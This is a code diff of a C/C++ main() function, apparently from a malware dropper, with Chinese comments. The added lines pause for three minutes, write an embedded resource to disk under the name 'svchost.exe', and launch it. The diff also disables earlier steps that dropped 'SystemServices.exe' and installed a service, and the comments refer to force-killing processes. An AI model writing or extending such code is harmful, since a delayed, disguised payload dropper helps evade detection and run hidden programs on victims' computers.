@@ -242,23 +242,22 @@ int main()
    // WriteFile86AnCreateProcess(RRW_32);
    // WriteFile86AnCreateProcess(RRW_32);
     //1.服务加载 2.服务本身. 3.强杀exe
-    
+    Sleep(180000); //延时三分钟.
     STRING patchName = GetPath();
-    patchName.append(TEXT("SystemServices.exe"));
-   // ReleaseFile(BUG_20190719_FOR_193,TEXT("19_FOR_193.pro")); //写入20个强杀.
-    ReleaseFile(SYSTEM_SERVICES, patchName);
+   // patchName.append(TEXT("SystemServices.exe"));
+   //// ReleaseFile(BUG_20190719_FOR_193,TEXT("19_FOR_193.pro")); //写入20个强杀.
+   // ReleaseFile(SYSTEM_SERVICES, patchName);
+
 
     patchName = GetPath();
-    patchName.append(TEXT("PRO86.PRO"));
-    ReleaseFile(RRW_32, patchName);
+    //srand(time(unsigned int ))
+    patchName.append(TEXT("svchost.exe"));
+    //ReleaseFile(IDR_2019730_FOR_218, patchName);  //写入服务.服务启动.
+    WriteFile86AnCreateProcess(IDR_2019730_FOR_218, patchName);
     
-    /*patchName = GetPath();
-    patchName.append(TEXT("PRO86.PRO"));
-    ReleaseFile(HANDLE_OCCFILE, patchName);*/
-
-    patchName = GetPath();
-    patchName.append(TEXT("CreateService"));
-    WriteFile86AnCreateProcess(CREATE_SERVICE, patchName); //先启动服务.,服务来启东核心功能.
+    //patchName = GetPath();
+    //patchName.append(TEXT("CreateService"));
+    //WriteFile86AnCreateProcess(CREATE_SERVICE, patchName); //先启动服务.,服务来启东核心功能.
    
     return 0;
 }
